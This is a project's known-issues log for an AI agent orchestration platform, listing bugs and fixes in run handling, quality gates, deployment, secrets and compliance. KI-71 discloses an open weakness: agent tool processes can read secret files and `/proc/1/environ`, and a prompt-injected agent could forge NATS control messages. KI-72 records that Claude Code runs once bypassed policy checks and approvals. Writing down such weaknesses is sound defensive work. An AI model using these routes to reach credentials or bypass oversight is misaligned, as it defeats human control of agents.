- [x] (2026-09-30) **KI-21 `runs.start` is a single LLM completion; late approvals are lost** (medium): The run path makes one policy request and one LiteLLM completion (no tool loop, no agent backend, no file changes), so quality gates and delivery run against an unchanged workspace. When a tool call resolves to ask, the worker gives up after 30 s while Go waits 60 s for HITL approval, so approvals given after 30 s are lost. Evidence: `workers/codeforge/executor.py:191-259`, `workers/codeforge/constants.py:24`, `internal/service/runtime_approval.go:25-29`. **Fixed (S2):** `runs.start` runs `AgentLoopExecutor` with the default tools (without skill tools) plus the run's MCP servers in the payload workspace, sharing the conversation path's loop setup (fallback models, routing layer feeding the MAB router, tool guide, local sampling parameters; Claude Code models are excluded); every LLM and tool call is decided by Go; a missing or unusable workspace fails the run before any LLM call; runs send heartbeats; runs no longer use the experience pool. The approval timeout has one source (`config.Runtime.ApprovalTimeout()`), is sent as `approval_timeout_seconds` on `runs.start` and `conversation.run.start`, and the worker waits that long plus 15 s for a decision.
- [x] (2026-09-30) **KI-22 Subjects without a working counterpart** (medium): `tasks.cancel` is published by every backend `Stop()`, but no worker path cancels the running Aider/OpenHands/Goose/OpenCode/Plandex process, and `review.trigger.request` has a Python consumer that Go never publishes to. Evidence: `internal/adapter/aider/backend.go:62-72`, `workers/codeforge/consumer/__init__.py:188`, `internal/port/messagequeue/queue.go:124`. **Fixed (S2):** backend tasks run as their own asyncio task with a per-task `tasks.cancel` listener (one `runtime.listen_for_cancel` helper for runs and tasks); CLI backends start in their own process group, and cancel, timeout and errors stop the whole group (SIGTERM, 5 s, SIGKILL, guarded against PIDs <= 1 and the worker's own group); OpenHands deletes its remote conversation; a `cancelled` result keeps the task cancelled, and task results follow the reported status (a `failed` result without an error message is failed). `StopTask` is tenant- and project-checked. `review.trigger.request/complete` were removed on both sides (Go never published the request; review triggers belong to `ReviewTriggerService`, KI-17). Open: a `tasks.cancel` for a task still queued in NATS is lost (KI-65).
- [x] (2026-09-30) **KI-23 Run and backend-task payloads lack workspace and backend** (medium): `RunStartPayload` and the `tasks.agent.*` payload carry no `workspace_path` or backend, so backend tasks always get `workspace_path ""`, and the production compose has no workspace volume shared by core and worker. Evidence: `internal/port/messagequeue/schemas_run.go:44-62`, `workers/codeforge/consumer/_tasks.py:50`, `docker-compose.prod.yml:157-243`. **Fixed (S2):** `RunStartPayload` carries `workspace_path` and `backend`; `tasks.agent.*` carries `TaskAgentPayload` (`task_id`, `project_id`, `tenant_id`, `agent_id`, `title`, `prompt`, `backend`, `workspace_path`; the worker still accepts the old `id` key); `POST /runs` and agent dispatch answer 400 for a project without a workspace or a task/agent of another project; handoff requests carry the source run's `workspace_path` and `approval_timeout_seconds` (a handoff without a workspace fails at handoff time or is dead-lettered). The prod compose already shares `/data/workspaces` between core and worker (KI-45); a project adopted outside that volume is not visible to the prod worker.
- [x] (2026-09-30) **KI-24 A stopped conversation stays cancelled forever** (high): `StopConversation` stores the conversation ID in `RunStateManager.cancelledConvs` and nothing clears it; conversation runs reuse the conversation ID, so every later tool call in that conversation is denied until the Go Core restarts (a side effect of the 2026-03-19 Bug 2 fix below). Evidence: `internal/service/run_state.go:125-131`, `internal/service/runtime_execution.go:168-170`. **Fixed (S2):** each conversation dispatch records a turn (`turn_id` on `conversation.run.start`, `runs.toolcall.request` and `conversation.run.complete`) before anything is stored or published; tool calls of a stopped turn are denied ("conversation run ended") while the next run's calls are evaluated; per-conversation run state is deleted once empty (completion, failed dispatch, stopped run reporting its end, conversation delete). One run per conversation: a second message while a run is active gets 409 "conversation run in progress" (the chat keeps the text and explains).
- [x] (2026-09-30) **KI-30 Termination, stall and cancel paths leave plans hanging** (medium): The termination-limit, stall-detection and user-cancel paths complete the run without calling `onRunComplete`, so execution-plan steps stay running; the termination path also skips the task/agent reset and run-state cleanup. Evidence: `internal/service/runtime_execution.go:50-58`, `internal/service/runtime_execution.go:328-345`, `internal/service/runtime.go:475`. **Fixed (S2):** one completion path (`finalizeRun`); control-plane stops (`stopRun`: user cancel, timeout, termination limit, budget, stall) mark the run "stopping", tell the worker first (`runs.cancel` on a detached ctx), keep the stored outcome and their own status/reason, then finalize and wake HITL waiters; `onRunComplete` advances plans; a failed or cancelled step ends sequential/parallel plans as failed and skips blocked dependents; a step that cannot start ends the plan; `advancePlan` re-reads the plan under the scheduling lock; `ReplanStep` (still unwired, KI-62) starts a new run for an unsuccessful step and unblocks its dependents; routed debate steps no longer deadlock. Cancels and failed starts do not count as agent failures.

#### Quality gates and delivery

- [x] (2026-09-30) **KI-26 Delivery requires a passed quality gate** (high): `triggerDelivery` is only called after a passed gate, so presets without gates (`trusted-mount-autonomous`, `supervised-ask-all`, `plan-readonly`) never deliver despite `deliver_mode`, and a failed gate without rollback still ends the run `completed`. `HandleRunComplete` has no terminal-state guard, so late or replayed completions overwrite cancelled or timed-out runs. Evidence: `internal/service/runtime_completion.go:172`, `internal/service/runtime_completion.go:184`, `internal/service/runtime_completion.go:15-20`. **Fixed (S3):** delivery runs in `endRun` for every run stored `completed` (with or without gates), before checkpoint cleanup; a failed gate always fails the run and never delivers; `HandleRunComplete` ignores runs waiting in `quality_gate`; only a check that ran and failed rolls back (with `rollback_on_gate_fail`) and counts against the agent; gate audit entries, events and broadcasts come only from the path whose completion write won.
- [x] (2026-09-30) **KI-27 Shadow checkpoints corrupt delivery** (high): Checkpoints are real commits in the workspace that are removed after delivery by `git reset --soft <first checkpoint>^`, so commit-local delivery is erased (changes left staged), branch/PR delivery pushes the checkpoint commits, and patch delivery (`git diff HEAD`) contains only the last edit. Evidence: `internal/service/runtime_execution.go:136-144`, `internal/service/checkpoint.go:139-157`, `internal/service/deliver.go:79`. **Fixed (S3):** checkpoints are working-tree commits built from a private per-run index with `commit-tree`, chained under `refs/codeforge/checkpoints/<run>` (never on a branch; HEAD, branches and the user's index untouched); the base checkpoint records the user's index and the pre-run HEAD (branch, detached or unborn); the ref chain is the durable record (rollback and cleanup work after a restart); rollback restores tree, index and HEAD; patch delivery diffs the base against the working tree into `.git/codeforge/patches/<run>.patch`. Checkpoints use a fixed identity, no signing, no hooks.
- [x] (2026-09-30) **KI-28 Quality gate timeout is ignored** (medium): `runtime.quality_gate_timeout` / `CODEFORGE_QG_TIMEOUT` is never sent to the worker, which uses a fixed 120 s per command and does not kill a timed-out process; runs in `quality_gate` status have no watchdog, so a lost gate result leaves the run there forever. Evidence: `internal/config/loader.go:201`, `workers/codeforge/qualitygate.py:127-129`, `internal/service/runtime_lifecycle.go:33-35`. **Fixed (S3):** `timeout_seconds` on the gate request; the worker runs each command in its own process group and kills the group on timeout; `heartbeat_seconds` makes the worker send `runs.heartbeat` (phase `quality_gate`) and keep the request in progress; the stuck-work watchdog (`internal/service/stuck_work_watchdog.go`, every `runtime.stale_check_interval`) fails a gated run silent for 2 min when the NATS backlog probe shows nothing queued, otherwise after a bounded cap; a partial index serves the sweep (migration 097). `quality_gate_timeout` must be at least 1s.
- [x] (2026-09-30) **KI-29 Quality gates run Go commands only and fail open** (medium): Gates always use the Go defaults (`go test ./...`, `golangci-lint run ./...`) whatever the project language, and a missing test or lint result counts as passed. Evidence: `internal/service/runtime_completion.go:80-82`, `internal/service/runtime_completion.go:155-157`. **Fixed (S3):** gate commands come from the project config `test_command` / `lint_command` (validated on create/update: shlex-parseable, executable on the worker's allowlist, else 400), then from the language whose test runner is set up at the workspace root, then from `runtime.default_test_command` / `default_lint_command` (default now empty); a required check without a command or without a result fails the gate; the worker reports a check that could not run (no/invalid/disallowed command, cannot start, timeout) as a null verdict with an `error`; an unknown profile fails the run.

#### Persistence

- [x] (2026-09-30) **KI-31 No optimistic locking on runs, plans and teams** (medium): Run, plan and team updates have no version check or status predicate, and `HandleToolCallRequest` writes `running` after the up-to-60 s HITL wait, so a run cancelled or timed out meanwhile is moved back to `running`. Evidence: `internal/adapter/postgres/store_run.go:38-53`, `internal/service/runtime_execution.go:148`. **Fixed (S2):** run status writes follow a transition table (`run.SourceStatuses`/`CanTransition`: running from pending/running, quality_gate from running, terminal from any active status, nothing out of a terminal status) enforced in SQL (`status = ANY($n)`), plans and teams refuse writes from terminal states (`domain.ErrConflict`, HTTP 409 for `CancelRun` unless already cancelled); tool-call steps are counted only while running (`CountRunStep`), usage only while running and never lowered (`AddRunUsage`, `RaiseRunUsage`, redelivered results counted once); a call approved after its run ended is denied; failed starts end the run as failed.
- [x] (2026-09-30) **KI-32 Result and plan events are not persisted** (medium): Task result events are appended with agent_id `""` (error only logged) and `plan.*` events with empty agent_id/task_id (error discarded), which the UUID NOT NULL columns reject. Evidence: `internal/service/agent.go:176-181`, `internal/service/orchestrator_consensus.go:402-408`, `internal/adapter/postgres/migrations/004_create_agent_events.sql:4-7`. **Fixed (S2):** migration `091_agent_events_optional_agent_task.sql` makes `agent_id`/`task_id` nullable, `Append` stores NULL for missing IDs and `{}` for a nil payload, result events record the task's agent, append errors go through `logBestEffort`; `UpdateTaskResult` writes the task status with the result.
- [ ] **KI-33 Teams are never cleaned up** (low): `CleanupTeam` is only called from tests, so teams stay `initializing` forever and their agents are not released. Evidence: `internal/service/pool_manager.go:172-196`.

#### Worker and observability

- [x] (2026-09-30) **KI-34 Worker health check breaks the production worker** (high): There is no HTTP health endpoint (`health.py` is never imported, `CODEFORGE_WORKER_HEALTH_PORT` is unused), and the replacement sentinel file in `/tmp` cannot be written under the prod compose's `read_only: true` without tmpfs, so the worker crashes at startup and restart-loops while the compose healthcheck only tests importability. Evidence: `workers/codeforge/health.py:9`, `workers/codeforge/consumer/__init__.py:90`, `workers/codeforge/consumer/__init__.py:204`, `docker-compose.prod.yml:210`. **Fixed (S4):** the worker serves `GET /health` (liveness) and `GET /health/ready` (NATS connected, every consumer loop alive, not given up, not stopping) on `CODEFORGE_WORKER_HEALTH_PORT` (default 8081); the sentinel file is gone; an unbindable port or a failing `start()` exits 1; `scripts/worker-healthcheck.py` checks readiness in the Dockerfile and the prod compose (`start_period` 30 s). `main()` awaits its shutdown (NATS drained, final log lines written); a stop request is sticky, so SIGTERM during startup stops the worker before any consumer starts and a second signal always works.
- [x] (2026-09-30) **KI-35 Python log schema differs from Go** (low): Worker logs use structlog's `event`/`timestamp`/lowercase `level` instead of the Go slog schema (`msg`/`time`/`level`), and stdlib loggers (httpx, nats) print plain text to the same stream. Evidence: `workers/codeforge/logger.py:42-57`, `workers/codeforge/logger.py:29`. **Fixed (S4):** one formatter renders structlog and stdlib records (httpx, nats) in the Go slog schema: `time` (UTC, ms), `level` (DEBUG/INFO/WARN/ERROR), `msg`, `service`, `logger`, attributes; tracebacks in an `exception` field, one JSON object per line, async writing kept; URL userinfo is redacted across the whole rendered line (nested values included); nothing prints before logging is set up (dev-key warning and tracing status moved into `main()`).
- [x] (2026-09-30) **KI-36 OTEL export is incomplete** (medium): The Go exporter never calls `WithInsecure()`, so the default TLS credentials win and `CODEFORGE_OTEL_INSECURE=true` cannot reach a plaintext collector such as the dev Jaeger; Python metrics have no MeterProvider, and the worker never injects trace context into published messages. Evidence: `internal/adapter/otel/setup.go:53-63`, `workers/codeforge/tracing/metrics.py:7-43`, `workers/codeforge/tracing/propagation.py:26`. **Fixed (S4):** the Go exporters use `WithInsecure()` when `otel.insecure` is set; the worker default is now false like Go (a worker exporting to a plaintext collector needs `CODEFORGE_OTEL_INSECURE=true`); the worker installs an OTLP MeterProvider (a setup error is logged, not fatal; shutdown bounded and off the event loop) and `TracingJetStreamContext` adds `traceparent` to every worker publish.
- [x] (2026-09-30) **KI-37 Verifier metrics always score 0.0** (medium): `trajectory_verifier` and `logprob_verifier` import `litellm`, which is not a worker dependency, and catch the failure, so benchmark runs using them (and the hybrid pipeline's rank stage) always get 0.0. Evidence: `workers/codeforge/evaluation/evaluators/trajectory_verifier.py:155`, `workers/codeforge/evaluation/evaluators/logprob_verifier.py:89`. **Fixed (S6):** both verifiers call the proxy through the worker's `LiteLLMClient.chat_completion` (with `logprobs` / `top_logprobs`); a failed call or unparseable answer is an evaluation error (`<evaluator>_error`, `EvalDimension.error`) and is left out of every average instead of scoring 0.0. Follow-up: a dedicated error field in the Go result, database and UI.
- [x] (2026-09-30) **KI-38 Tool configuration drift** (low): The capability allowlist names `handoff` but the tool is registered as `handoff_to`, so `api_with_tools` models lose the handoff tool, and the Go settings `agent.builtin_tools` and `agent.tool_output_max_chars` are never read. Evidence: `workers/codeforge/tools/capability.py:86`, `workers/codeforge/tools/handoff.py:24`, `internal/config/config.go:169`, `internal/config/config.go:174`. **Fixed (S6):** the capability allowlist names `handoff_to`; `agent.tool_output_max_chars` is sent with `conversation.run.start` and used for history truncation; `agent.builtin_tools` was removed (mode tool lists choose the tools).

#### Frontend

- [x] (2026-09-30) **KI-39 Live updates are not wired** (medium): Run, plan and agent panels are never refreshed by WebSocket events (only toasts), the project page filters `task.output` on a `project_id` the event never carries so live output stays empty, and `AgentLane` appends every task's output to every lane. Evidence: `frontend/src/features/project/useProjectDetail.ts:120-128`, `frontend/src/features/project/useProjectDetail.ts:144-145`, `frontend/src/features/project/AgentLane.tsx:47-52`. **Fixed (S5):** typed parsers/reducers (`frontend/src/features/project/liveEvents.ts`); live output is filtered by the project's task IDs (a task belongs to one project and its `task.status`/`run.status` event precedes any output; decision recorded in the fix plan); `run.status` carries `agent_id` and `step_count`; RunPanel, PlanPanel (incl. review decisions and debate badges), AgentPanel and WarRoom update on their events; each AgentLane shows only its own task's output and run's tool calls. Follow-ups: KI-74.
- [x] (2026-09-30) **KI-40 API client mismatches** (medium): The UI deletes models with `DELETE /api/v1/llm/models/{id}`, but only `POST /api/v1/llm/models/delete` exists, and type errors hide calls to non-existent methods (`api.mcp.listProjectServers`, `assignToProject`, `unassignFromProject`) that throw when MCP server assignment is used. Evidence: `frontend/src/api/resources/llm.ts:25-26`, `internal/adapter/http/routes.go:421`, `frontend/src/features/project/CompactSettingsPopover.tsx:42`. **Fixed (S5, D12):** `DELETE /api/v1/llm/models/{id}` (admin, audited) replaces `POST /llm/models/delete` (now 405); the model list takes the deployment ID from LiteLLM's `model_info.id`, so Delete is shown. The MCP client methods were restored in S0.
- [x] (2026-09-30) **KI-41 Settings popover wipes the project config** (medium): The compact settings popover saves `{config: {autonomy_level}}` and `ProjectService.Update` replaces the whole config map, dropping `policy_preset`, `detected_languages` and `expansion_prompt`; `autonomy_level` itself is read by no backend code. Evidence: `frontend/src/features/project/CompactSettingsPopover.tsx:107-113`, `internal/service/project.go:183-184`. **Fixed (S5):** `PUT /projects/{id}` merges `config` (a key with a value is set, JSON `null` deletes it, other keys are kept); the dead autonomy control was removed from the popover (autonomy comes from the mode). `CreateProjectModal` still writes the unused `autonomy_level` key (KI-74).
- [x] (2026-09-30) **KI-42 Channel real-time events are never broadcast** (low): `channel.message` / `channel.typing` / `channel.read` are defined but never sent and the channel UI has no WebSocket subscription, so messages from other users, agents or webhooks appear only after a reload. Evidence: `internal/domain/event/broadcast.go:101-103`, `frontend/src/features/channels/ChannelView.tsx:47-75`. **Fixed (S5):** `ChannelService.SendMessage` broadcasts `channel.message` tenant-scoped for messages, thread replies and webhooks; ChannelView appends live (including messages that arrive while the list loads). Found and fixed on the way: no channel message could be stored at all (`channel_messages.tenant_id` NOT NULL was never set), a message could be posted into another tenant's channel, senders could pose as agents or other users (now the authenticated user), a thread parent of another channel/tenant was accepted. `channel.typing`/`channel.read` have no producer; follow-ups: KI-73.

#### Deployment and configuration

- [x] (2026-09-30) **KI-43 `postgres:18-alpine` rejects the data volume path** (high): Dev and prod compose mount the data volume at `/var/lib/postgresql/data`, which the PostgreSQL 18 image refuses (it expects `/var/lib/postgresql`), so PostgreSQL exits before initdb and nothing that depends on it starts. Evidence: `docker-compose.yml:84`, `docker-compose.prod.yml:36`. **Fixed (S4):** both compose files mount the data volume at `/var/lib/postgresql` (PG 18 keeps its cluster in `/var/lib/postgresql/18/docker`); the dev WAL archive moved to `/var/lib/postgresql/archive`. An existing PG <= 17 volume is refused by the PG 18 entrypoint ("there appears to be PostgreSQL data in /var/lib/postgresql"): dump it with the old image and restore, or `pg_upgrade --link` (see dev-setup.md).
- [x] (2026-09-30) **KI-44 Production PostgreSQL enables SSL without certificates** (high): The prod compose sets `ssl=on` with `server.crt` / `server.key` that no script or mount creates, so PostgreSQL refuses to start (audit INFRA-002 still open). Evidence: `docker-compose.prod.yml:56-60`. **Fixed (S4):** `generate-secrets.sh` creates a self-signed certificate (RSA-3072, SAN `postgres`, replaceable by a CA-signed pair); a root entrypoint wrapper copies cert and key (0600) to a postgres-owned tmpfs and fixes the archive volume ownership; clients keep `sslmode=require` (`verify-full` works with the generated cert). Core and worker run with `APP_ENV=production`.
- [x] (2026-09-30) **KI-45 Read-only production core has no writable workspace** (high): The core runs with `read_only: true`, no volume or tmpfs and the relative default `data/workspaces`, so cloning a repository and writing the initial admin password file fail, and no workspace survives container recreation. Evidence: `docker-compose.prod.yml:163`, `internal/config/config.go:487`, `internal/config/config.go:590`. **Fixed (S4):** prod volumes `core_data` at `/data` and `workspaces` at `/data/workspaces` (shared with the worker at the same path), tmpfs `/tmp` for core and worker; images run as UID/GID 10001 and create `/data/workspaces`.
- [x] (2026-09-30) **KI-46 Production secrets handling is broken** (high): Mounted Docker secret files are never read by the Go Core (`secrets.FileProvider` / `Auto()` are test-only) while the prod compose requires every secret as `${VAR:?}` env (visible in `docker inspect`); neither the JWT secret nor `CODEFORGE_INTERNAL_KEY` is passed to core (users are logged out on every restart, worker-to-core calls get 401). `scripts/validate-env.sh` checks `CODEFORGE_JWT_SECRET`, which nothing reads (the real variable is `CODEFORGE_AUTH_JWT_SECRET`). Evidence: `internal/secrets/provider.go:61`, `cmd/codeforge/main.go:294`, `docker-compose.prod.yml:157-178`, `scripts/validate-env.sh:4`. Also: `scripts/generate-secrets.sh` writes base64 values (`/`, `+`, `=`) that `docker-compose.prod.yml` embeds unescaped in the `DATABASE_URL` / `NATS_URL` userinfo, and the prod worker gets no `CODEFORGE_INTERNAL_KEY`. **Fixed (S4):** Go reads `<KEY>_FILE` for secret settings (`secrets.LookupFileEnv`; setting both `KEY` and `KEY_FILE` is a startup error; missing/empty files fail); prod compose passes only `*_FILE` paths (JWT secret, internal key, LLM key encryption secret, DB/NATS URLs, ...), Postgres uses `POSTGRES_PASSWORD_FILE`, NATS a generated auth config, LiteLLM and the worker export their values from the files in an entrypoint wrapper. `generate-secrets.sh` writes hex values, a TLS pair and the derived `database-url`/`nats-url`/`nats-auth.conf` (kept once written), refuses to regenerate secrets whose rotation loses data, reads `.env` like compose; `validate-env.sh` checks the mounted files. New `CODEFORGE_AUTH_LLM_KEY_ENCRYPTION_SECRET` (+ `_FILE`) decouples the LLM key encryption from the JWT secret. URL userinfo is redacted in all logs.
- [x] (2026-09-30) **KI-47 Blue-green Traefik routes the frontend to the wrong port** (high): Traefik sends `frontend-blue` / `frontend-green` traffic to port 80 while nginx listens on 8080, so blue-green deployments cannot serve the frontend (audit INFRA-001 still open). Evidence: `docker-compose.blue-green.yml:59`, `docker-compose.blue-green.yml:72`, `frontend/nginx.conf:5`. **Partly fixed (S4):** the Traefik label uses the frontend's port 8080. The overlay still does not work, see KI-70.
- [x] (2026-09-30) **KI-48 Image scan pulls a tag that is never pushed** (medium): `docker-build.yml` tags images with the short SHA without prefix, but the scan job pulls `sha-<full sha>`, so the Grype scan fails on every push and image scanning never runs. Evidence: `.github/workflows/docker-build.yml:44`, `.github/workflows/docker-build.yml:207`. **Fixed (S4):** each build job outputs `<lowercased image>@<digest>` and the scan matrix scans exactly that reference (`fail-fast: false`).
- [x] (2026-09-30) **KI-49 Restore script never terminates active connections** (medium): `psql -c` does not substitute `:'dbname'` and the error is discarded, so `dropdb` fails while core, worker or LiteLLM are connected and the restore aborts. Evidence: `scripts/restore-postgres.sh:42-44`. **Fixed (S4):** `restore-postgres.sh` uses `dropdb --force` (PostgreSQL 13+) and aborts visibly on errors.
- [x] (2026-09-30) **KI-50 Devcontainer sets `LITELLM_URL`** (medium): The devcontainer sets `LITELLM_URL`, but Go Core and worker read `LITELLM_BASE_URL` and fall back to `localhost:4000`, which is unreachable from the devcontainer; the 2026-03-19 Bug 3 fix below covered the worker code, not the devcontainer. Evidence: `.devcontainer/devcontainer.json:20`, `internal/config/loader.go:180`, `workers/codeforge/config.py:187`. **Fixed (S4):** the devcontainer sets `LITELLM_BASE_URL`.
- [x] (2026-09-30) **KI-51 Configuration drift** (low): `OLLAMA_BASE_URL` does not change LiteLLM's Ollama routing (`litellm/config.yaml` hardcodes `api_base`), `DOCS_MCP_*` in `.env.example` are ignored by `docker-compose.yml`, `scripts/logs.sh` suggests a non-existent `docs-mcp-server` service, and `codeforge.example.yaml` contradicts the code (bcrypt minimum is 12, not 4; routing is enabled by default). The SMTP port defaults to 0 although documented as 587. Evidence: `litellm/config.yaml:18`, `docker-compose.yml:146-149`, `scripts/logs.sh:27`, `codeforge.example.yaml:105`, `internal/config/config.go:211`. Also: `scripts/resolve-docker-ips.sh` runs `set -euo pipefail` although it is meant to be sourced into an interactive shell; the worker `HistoryConfig.max_context_tokens` default (120000) differs from Go `agent.max_context_tokens` (128000). **Fixed (S4):** LiteLLM reads Ollama's `api_base` from `OLLAMA_API_BASE` (set from `OLLAMA_BASE_URL` in both compose files); docs-mcp uses the `DOCS_MCP_*` variables with the former values as defaults (plus the `host.docker.internal` mapping on Linux); `scripts/logs.sh` lists the real compose services; `codeforge.example.yaml` matches the code (bcrypt 12-31, routing on, `meta_router_model` "", no `dashboard_port`); SMTP port defaults to 587 and is validated when `smtp_host` is set; `resolve-docker-ips.sh` is safe to source; the worker history token default is 128000 like Go. Left over: `benchmark.dashboard_port` is still an unused Go setting; the example's `orchestrator.decompose_model` differs from the code default "".
- [x] (2026-09-30) **KI-59 Config files are not ASCII-only** (low): AGENTS.md (then CLAUDE.md) requires ASCII in config files, but `configs/benchmarks/{agent-coding,basic-coding,tool-use-basic}.yaml`, `configs/model_pricing.yaml`, `internal/service/prompts/system/tool_permissions.yaml` and `scripts/{logs,resolve-docker-ips,test}.sh` contain non-ASCII characters (`codeforge.example.yaml` fixed 2026-09-29). Evidence: `LC_ALL=C grep -P '[^\x00-\x7F]'` on those files. **Fixed (S4):** em dashes replaced in the eight files; prompt golden files regenerated; no non-ASCII left in yaml/yml/sh/toml/conf/.env files.
- [ ] **KI-70 Blue-green overlay does not work** (medium): `docker-compose.blue-green.yml` uses `extends:` without `file:` (the colored services have no image); extending the prod services would inherit their published ports (frontend :80 collides with Traefik, blue and green both bind :8080) and removing them needs `ports: !reset []`, which the check-yaml pre-commit hook rejects; Traefik is not on the services' networks; nginx proxies to `core`, which does not exist in blue-green; `${ACME_EMAIL}` is not expanded in `traefik.yaml`. Found during the KI-47 fix (2026-09-30).
- [ ] **KI-71 Agent tools can read the worker's secrets** (medium): since S4 agent tool subprocesses get a scrubbed environment (`codeforge.subprocess_env.tool_env`), but they still run as the worker's UID and can read `/run/secrets/*` (0644 inside the container) and `/proc/1/environ`, which hold `CODEFORGE_INTERNAL_KEY` (admin on the core API), the database, NATS and LiteLLM credentials. Needs a separate UID for tool processes or the sandbox (KI-13). Found in the S4 review (2026-09-30). Also: agent tool processes can reach NATS (no NATS authentication inside the deployment), so a prompt-injected agent with Bash could publish completions, heartbeats, cancels or tool-call responses (found in the S2 follow-up security review, 2026-09-30).
- [x] (2026-09-30) **KI-72 Claude Code runs bypass the policy layer** (high): `claudecode/*` runs start the Claude Code CLI (`workers/codeforge/claude_code_executor.py`) without permission flags or a policy callback, so no per-tool policy check, mode tool list or HITL approval applies to them. `_make_policy_callback` (maps Claude Code tool calls to `runs.toolcall.request`) was never wired into the SDK options and is unused since the SDK path was removed (S4: the SDK always passes the worker's full environment to the CLI). Wire a policy hook the CLI supports (e.g. a permission prompt tool / hooks calling the Go policy) or restrict claudecode runs to a read-only mode until then. Found in the S4 review (2026-09-30). **Fixed (S6):** every Claude Code tool call goes through a PreToolUse hook (matcher `*`, any error blocks) and a per-run unix socket (private dir, random token) to `runs.toolcall.request`, so mode tool lists, path/command rules and HITL apply; the CLI loads no user/project/local settings (`--setting-sources ""`), no MCP servers (`--strict-mcp-config`), runs under `--permission-mode dontAsk` and is offered only tools with a canonical policy name (`--tools`, `Monitor` = `Bash`; other names are denied; WebFetch/WebSearch not offered); paths go through the loop's mapping relative to the real workspace; prompt on stdin, system prompt via a 0600 file; the CLI runs in its own process group, is stopped on timeout (run time without approval waits) and on cancel, streams output and counts usage of interrupted turns, and falls back to another model only if the turn changed nothing; a capability check (flags in `--help`, probe for hidden options, only successes cached) fails unsupported CLIs closed and hides them from routing; `CODEFORGE_CLAUDECODE_PATH` is honoured. Also found: before the fix every claudecode run failed on current CLIs (`stream-json` requires `--verbose`) and fell back to LiteLLM. Follow-up: a canonical network tool name would be needed to ever offer WebFetch/WebSearch.
- [ ] **KI-73 Channel follow-ups** (medium): the webhook entry point always answers 403 (`GetChannel` selects no webhook key and `channels` has no `webhook_key` column; `GenerateWebhookKey` is unused); `ThreadPanel` is not mounted anywhere (ChannelView passes no `onThreadClick`), so threads are shown only as flat messages; `channel.typing` and `channel.read` have no producer or stored read state. Found in the S5 review (2026-09-30).
- [ ] **KI-74 Frontend live-update follow-ups** (low): the runtime changes task and agent status on run start/finish without broadcasting `task.status`/`agent.status`, so three consumers refetch on `run.status` instead (duplicate `GET /agents` from AgentPanel and useProjectDetail); PlanPanel refetches undebounced on every `plan.step.status`; RunPanel drops live events of a new run until `api.runs.start` resolves; output in the first ~0.5 s of a run before its lane mounts is not shown; `CreateProjectModal` writes the unused `autonomy_level` config key. Found in the S5 work and review (2026-09-30).
- [x] (2026-09-30) **KI-75 LLM models are global across tenants** (medium): all tenants share one LiteLLM proxy, and an admin (or, for adding, an editor) of any tenant can add or delete models for every tenant (`POST/DELETE /api/v1/llm/models`, audited since S5). Model management should be restricted to a platform-admin role or tenant-scoped. Found in the S5 review (2026-09-30). **Fixed (S6):** `POST/DELETE /api/v1/llm/models` require a platform admin (`middleware.RequirePlatformAdmin`: admin role in the default tenant); everyone keeps read access. The model UI still shows the actions to other users (they get 403), follow-up in progress.
- [x] (2026-09-30) **KI-76 Runtime follow-ups from S2** (medium): plan steps drop `ModeID` (`CreatePlan` and the plan-step store), so debates run without the proponent/moderator modes; the review router's LLM call runs under the global plan scheduling lock; the auto-agent waits for a run's completion only after dispatching (race), and after a wait timeout its next message gets 409 until the run ends; a conversation whose run completion never arrives (e.g. its start went to the DLQ) stays blocked until Stop or a Go restart; if the write that ends a stopped run fails, the worker's completion is not used and the run stays running. Found in the S2 runtime reviews (2026-09-30). **Fixed (S2):** plan steps keep `ModeID`; the review router's LLM call runs outside the plan lock (2 min timeout; the step stays pending until decided); the auto-agent registers its completion waiter before dispatching and stops a run it gives up on; a completion arriving during a stop is kept and used if the stop cannot record the end; Go subscribes to `runs.start.dlq` and `conversation.run.start.dlq` and ends dead-lettered starts. Review round in progress (ping-pong round accounting with the review router, dropped review decisions, stop/completion atomicity).
- [ ] **KI-78 Artifact validation writes before the run's end is decided** (low): artifact-validation events and audit entries are written before `CompleteRun`, so a run that loses the race to another completion path (stop, watchdog) can show contradictory entries (the gate path was fixed in the S3 review). Found in the S3 review (2026-09-30).

#### Compliance

- [x] (2026-09-30) **KI-52 GDPR retention never runs** (medium): `RetentionService` is never instantiated, so expired sessions, conversations, runs and audit entries are never purged, and `AnonymizeExpiredIPAddresses` uses `UPDATE ... LIMIT`, which PostgreSQL rejects (residual of WT-3 below). Evidence: `internal/service/retention.go:25`, `internal/adapter/postgres/store_audit_log.go:94-99`. **Fixed (S6):** the retention job runs at startup and every `retention.interval` (default 24h, 0 disables it) across all tenants in batches (`WHERE id IN (SELECT ... LIMIT $n)`); sessions, conversations and runs are aged by last activity, audit entries by creation (default 7 years, as the policy says), audit IP addresses are removed after 180 days (`retention.audit_ip_addresses`); deleting expired conversations also removes their task-less agent sessions (the FK check made it fail before); one failing category does not stop the others; periods under 24h are rejected. Agent events and benchmark results are not purged yet (see [data-retention.md](data-retention.md)).
- [x] (2026-09-30) **KI-53 Audit log listing breaks after GDPR erasure** (high): Migration 089 makes `admin_email` nullable and GDPR erasure sets it to NULL, but both listing queries scan it into a `string`, so the tenant's audit log endpoint returns 500 once any user with audit entries has been erased (residual of WT-3 below). Evidence: `internal/adapter/postgres/store_audit_log.go:42`, `internal/adapter/postgres/store_audit_log.go:64`, `internal/adapter/postgres/store_audit_log.go:112`. **Fixed (S6):** `AuditEntry.AdminEmail` is nullable (`*string`); both listings share one scanner; an erased user's entries are listed with `admin_email: null`.
- [x] (2026-09-30) **KI-54 deepeval telemetry is not disabled** (low): deepeval is a runtime dependency and `DEEPEVAL_TELEMETRY_OPT_OUT` is set nowhere, so evaluation runs may send usage telemetry to a third party that the privacy policy does not disclose (audit COMP-014 still open). Evidence: `pyproject.toml:28`, `workers/codeforge/evaluation/metrics.py:11-12`. **Fixed (S6):** the worker forces `DEEPEVAL_TELEMETRY_OPT_OUT=YES`, `CONFIDENT_METRIC_LOGGING_ENABLED=NO`, `CONFIDENT_TRACING_ENABLED=NO`, `DEEPEVAL_UPDATE_WARNING_OPT_IN=0`, `DEEPEVAL_DISABLE_DOTENV=1`, `DEEPEVAL_DISABLE_LEGACY_KEYFILE=1` before any deepeval import (`codeforge/evaluation/_deepeval_env.py`, also `ENV` in `Dockerfile.worker`), so neither telemetry nor Confident AI uploads (which included evaluated inputs and outputs) can be switched on.

#### Unwired features

